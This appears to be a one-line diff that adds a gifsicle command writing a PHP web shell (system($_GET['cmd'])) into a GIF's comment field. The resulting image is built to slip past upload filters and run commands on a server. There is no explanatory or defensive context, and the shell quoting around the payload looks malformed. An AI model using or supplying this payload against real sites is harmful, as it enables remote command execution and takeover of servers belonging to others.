@@ -1,0 +1,1 @@
+gifsicle --comment " `tr '\n' ' ' <?php echo system($_GET['cmd']); exit; ?>` "< file.gif > output.gif
